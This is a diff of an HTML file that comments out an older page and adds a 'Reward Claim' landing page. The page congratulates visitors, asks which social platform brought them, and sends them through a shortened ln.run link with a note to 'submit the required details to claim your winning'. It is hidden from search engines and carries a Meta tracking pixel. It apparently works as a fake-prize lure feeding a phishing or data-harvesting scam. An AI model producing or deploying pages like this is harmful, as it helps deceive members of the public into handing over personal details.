@@ -1,7 +1,8 @@
+<!--
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <!-- Meta Pixel Code -->
+ 
 <script>
 !function(f,b,e,v,n,t,s)
 {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
@@ -17,7 +18,7 @@ fbq('track', 'PageView');
 <noscript><img height="1" width="1" style="display:none"
 src="https://www.facebook.com/tr?id=848942484477212&ev=PageView&noscript=1"
 /></noscript>
-<!-- End Meta Pixel Code -->
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -113,3 +114,252 @@ h1{font-size:42px;line-height:1.1;font-weight:800}
 </div>
 </body>
 </html>
+  -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '848942484477212');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=848942484477212&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="noindex,nofollow">
+  <title>Reward Claim</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,400;9..144,500;9..144,600&family=Inter:wght@400;500;600&display=swap');
+ 
+#dpz{
+  --bg1:#eaf3ef; --bg2:#e9eef6;
+  --card:#ffffff; --ink:#22303c; --muted:#6b7a8a;
+  --accent:#0f7a63; --accent-dk:#0c6552; --accent-soft:#e4f1ec; --line:#e7ecf1;
+  --tiktok:#15171a; --insta:#d6256b; --fb:#1877f2;
+  --display:'Fraunces',Georgia,'Times New Roman',serif;
+  --ui:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
+ 
+  box-sizing:border-box; margin:0;
+  min-height:100svh; width:100%;
+  display:flex; align-items:center; justify-content:center;
+  padding:16px;
+  font-family:var(--ui); color:var(--ink);
+  background:linear-gradient(165deg,var(--bg1),var(--bg2));
+  -webkit-font-smoothing:antialiased;
+}
+#dpz *,#dpz *::before,#dpz *::after{box-sizing:border-box;}
+
+#dpz .ticket{
+  position:relative; width:100%; max-width:380px;
+  background:var(--card); border-radius:22px;
+  box-shadow:0 18px 50px -22px rgba(20,40,55,.32),0 2px 8px -4px rgba(20,40,55,.18);
+  padding:24px 24px 20px;
+  animation:dpz-rise .6s cubic-bezier(.2,.7,.2,1) both;
+}
+ 
+#dpz .eyebrow{
+  font-size:.7rem; letter-spacing:.18em; text-transform:uppercase;
+  font-weight:600; color:var(--accent); text-align:center; margin:0 0 6px;
+}
+#dpz .congrats{
+  font-family:var(--display); font-weight:500; font-size:1.5rem;
+  line-height:1.05; text-align:center; margin:0;
+}
+#dpz .subtitle{
+  text-align:center; color:var(--muted); font-size:.88rem; margin:0 0 8px 0;
+}
+ 
+#dpz .perf{position:relative; height:28px; margin:12px -24px 10px;}
+#dpz .perf::before{
+  content:""; position:absolute; top:50%; left:18px; right:18px;
+  border-top:2px dashed var(--line);
+}
+#dpz .perf .notch{
+  position:absolute; top:50%; width:24px; height:24px; border-radius:50%;
+  background:linear-gradient(165deg,var(--bg1),var(--bg2));
+  transform:translateY(-50%);
+}
+#dpz .perf .notch.l{left:-12px;}
+#dpz .perf .notch.r{right:-12px;}
+ 
+#dpz .ask{text-align:center; font-weight:600; font-size:.94rem; margin:0 0 10px;}
+ 
+#dpz .opts{display:flex; flex-direction:column; gap:8px;}
+#dpz .opt{
+  display:flex; align-items:center; gap:13px;
+  text-decoration:none; color:var(--ink); cursor:pointer;
+  border:1.5px solid var(--line); border-radius:14px;
+  padding:10px 14px; background:#fff;
+  font-weight:500; font-size:.96rem;
+  transition:transform .12s ease,box-shadow .18s ease,border-color .18s ease,background .18s ease;
+}
+#dpz .opt:hover,#dpz .opt:focus-visible{
+  transform:translateY(-1px); border-color:#d4dce4;
+  box-shadow:0 8px 18px -12px rgba(20,40,55,.45); outline:none;
+}
+#dpz .opt:focus-visible{outline:2px solid var(--accent); outline-offset:2px;}
+#dpz .opt.selected{
+  border-color:var(--accent); background:var(--accent-soft);
+  box-shadow:0 8px 18px -12px rgba(15,122,99,.5);
+}
+#dpz .opt .tile{
+  flex:0 0 auto; width:32px; height:32px; border-radius:9px;
+  display:flex; align-items:center; justify-content:center;
+}
+#dpz .opt .tile svg{width:19px; height:19px; display:block;}
+#dpz .opt[data-p="tiktok"]   .tile{background:#f0f1f3; color:var(--tiktok);}
+#dpz .opt[data-p="instagram"].tile{background:#fbe7f0; color:var(--insta);}
+#dpz .opt[data-p="facebook"] .tile{background:#e7f0fe; color:var(--fb);}
+#dpz .opt .label{flex:1;}
+#dpz .opt .chev{flex:0 0 auto; color:#b9c4ce;}
+#dpz .opt .check{flex:0 0 auto; color:var(--accent); display:none;}
+#dpz .opt.selected .chev{display:none;}
+#dpz .opt.selected .check{display:block;}
+ 
+#dpz .cta{
+  display:flex; align-items:center; justify-content:center; gap:8px;
+  width:100%; margin-top:12px; border:none; cursor:pointer;
+  color:#fff; background:var(--accent); border-radius:14px;
+  padding:13px 18px; font-family:var(--ui); font-weight:600; font-size:1.02rem;
+  transition:transform .12s ease,box-shadow .18s ease,background .18s ease;
+  box-shadow:0 10px 22px -12px rgba(15,122,99,.7);
+}
+#dpz .cta:hover:not(:disabled),#dpz .cta:focus-visible:not(:disabled){
+  background:var(--accent-dk); transform:translateY(-1px);
+  box-shadow:0 14px 26px -12px rgba(15,122,99,.8); outline:none;
+}
+#dpz .cta:focus-visible{outline:2px solid var(--accent); outline-offset:3px;}
+#dpz .cta:disabled{
+  background:#e4e9ee; color:#9aa7b3; cursor:not-allowed; box-shadow:none;
+}
+ 
+#dpz .note{
+  display:flex; gap:8px; align-items:flex-start;
+  margin:12px 2px 0; padding:10px 12px;
+  background:var(--accent-soft); border-radius:12px;
+  color:#34564c; font-size:.77rem; line-height:1.35;
+}
+#dpz .note svg{flex:0 0 auto; margin-top:1px; color:var(--accent);}
+ 
+@keyframes dpz-rise{from{opacity:0; transform:translateY(14px);}to{opacity:1; transform:none;}}
+@keyframes dpz-pop{from{opacity:0; transform:scale(.82);}to{opacity:1; transform:none;}}
+ 
+@media (max-height:700px){
+  #dpz .ticket{padding:18px 22px 16px;}
+  #dpz .perf{height:22px; margin:9px -22px 8px;}
+  #dpz .opt{padding:9px 13px;}
+  #dpz .cta{padding:11px 18px; margin-top:10px;}
+  #dpz .note{margin-top:10px;}
+}
+@media (prefers-reduced-motion:reduce){
+  #dpz .ticket{animation:none;}
+}
+</style>
+</head>
+<body>
+<div id="dpz">
+  <div class="ticket" role="region" aria-label="Your reward">
+ 
+    <p class="eyebrow"></p>
+    <h1 class="congrats">Congratulations! &#127881;</h1>
+    <p class="subtitle">Please select the platform you came from.</p>
+ 
+    <div class="perf" aria-hidden="true">
+      <span class="notch l"></span><span class="notch r"></span>
+    </div>
+ 
+    <p class="ask" id="dpz-ask">Which platform brought you here?</p>
+ 
+    <div class="opts" role="radiogroup" aria-labelledby="dpz-ask">
+      <a class="opt" data-p="tiktok" href="#" role="radio" aria-checked="false" aria-label="I came from TikTok">
+        <span class="tile" data-p="tiktok">
+          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M16.5 3c.3 1.9 1.5 3.3 3.4 3.5v2.4c-1.2 0-2.3-.4-3.3-1v5.6c0 3.2-2.6 5.5-5.6 4.9-2.3-.4-3.9-2.4-3.8-4.7.1-2.4 2.2-4.3 4.6-4.1.2 0 .4 0 .6.1v2.5c-.2-.1-.5-.1-.7-.1-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2V3h2.5z"/></svg>
+        </span>
+        <span class="label">TikTok</span>
+        <svg class="chev" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 6l6 6-6 6"/></svg>
+        <svg class="check" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
+      </a>
+ 
+      <a class="opt" data-p="instagram" href="#" role="radio" aria-checked="false" aria-label="I came from Instagram">
+        <span class="tile" data-p="instagram">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="5"/><circle cx="12" cy="12" r="4"/><circle cx="17.4" cy="6.6" r="1.1" fill="currentColor" stroke="none"/></svg>
+        </span>
+        <span class="label">Instagram</span>
+        <svg class="chev" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 6l6 6-6 6"/></svg>
+        <svg class="check" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
+      </a>
+ 
+      <a class="opt" data-p="facebook" href="#" role="radio" aria-checked="false" aria-label="I came from Facebook">
+        <span class="tile" data-p="facebook">
+          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M13.5 21v-7h2.3l.4-2.8h-2.7V9.4c0-.8.2-1.4 1.4-1.4h1.4V5.5c-.3 0-1.2-.1-2.2-.1-2.2 0-3.7 1.3-3.7 3.8v2H8v2.8h2.1V21h3.4z"/></svg>
+        </span>
+        <span class="label">Facebook</span>
+        <svg class="chev" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 6l6 6-6 6"/></svg>
+        <svg class="check" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
+      </a>
+    </div>
+ 
+    <button class="cta" id="dpz-continue" type="button" disabled aria-disabled="true">
+      Continue
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h13M13 6l6 6-6 6"/></svg>
+    </button>
+ 
+    <div class="note">
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M12 8h.01M11 12h1v4h1"/></svg>
+      <span>Read the next page carefully and submit the required details to claim your winning.</span>
+    </div>
+ 
+  </div>
+</div>
+ 
+<script>
+(function(){
+  var selected = null;
+  var opts = document.querySelectorAll("#dpz .opt");
+  var cont = document.getElementById("dpz-continue");
+
+  opts.forEach(function(btn){
+    btn.addEventListener("click", function(e){
+      e.preventDefault();
+
+      opts.forEach(function(o){
+        o.classList.remove("selected");
+        o.setAttribute("aria-checked", "false");
+      });
+
+      btn.classList.add("selected");
+      btn.setAttribute("aria-checked", "true");
+
+      selected = btn.getAttribute("data-p");
+
+      cont.disabled = false;
+      cont.setAttribute("aria-disabled", "false");
+    });
+  });
+
+  cont.addEventListener("click", function(){
+    if (!selected) return;
+
+    var NEXT_PAGE = "https://ln.run/xR-rK";
+    var url = new URL(NEXT_PAGE);
+
+    url.searchParams.set("platform", selected);
+
+    window.location.href = url.toString();
+  });
+})();
+</script>
+</body>
+</html>
+  
